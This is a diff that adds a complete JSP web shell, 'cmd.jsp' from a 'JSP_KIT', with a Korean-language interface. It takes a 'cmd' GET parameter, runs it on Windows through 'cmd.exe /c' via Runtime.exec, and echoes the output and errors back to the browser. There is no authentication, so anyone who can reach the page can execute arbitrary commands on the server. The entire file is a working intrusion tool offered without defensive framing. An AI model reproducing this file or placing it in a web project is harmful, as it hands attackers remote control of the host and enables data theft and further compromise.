@@ -1,0 +1,52 @@
+<%@ page import="java.util.*, java.io.*" %>
+<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (Windows with Korean Support)
+//
+// by: Unknown
+// modified: [현재 날짜]
+//
+%>
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>명령 실행</title>
+</head>
+<body>
+    <form method="get" name="myform" action="">
+        <input type="text" name="cmd" placeholder="명령어 입력">
+        <input type="submit" value="실행">
+    </form>
+    <pre>
+<%
+if (request.getParameter("cmd") != null) {
+    String command = "cmd.exe /c " + request.getParameter("cmd"); // Windows 명령어 실행
+    out.println("실행된 명령어: " + command + "<br>");
+    Process p = Runtime.getRuntime().exec(command);
+
+    // 프로세스 출력 읽기
+    InputStream in = p.getInputStream();
+    InputStream err = p.getErrorStream(); // 에러 출력 읽기
+    BufferedReader reader = new BufferedReader(new InputStreamReader(in, "MS949")); // Windows 기본 인코딩
+    BufferedReader errorReader = new BufferedReader(new InputStreamReader(err, "MS949"));
+
+    String line;
+    while ((line = reader.readLine()) != null) {
+        out.println(line + "<br>");
+    }
+    reader.close();
+
+    // 에러 출력 처리
+    while ((line = errorReader.readLine()) != null) {
+        out.println("<font color='red'>" + line + "</font><br>");
+    }
+    errorReader.close();
+}
+%>
+    </pre>
+</body>
+</html>
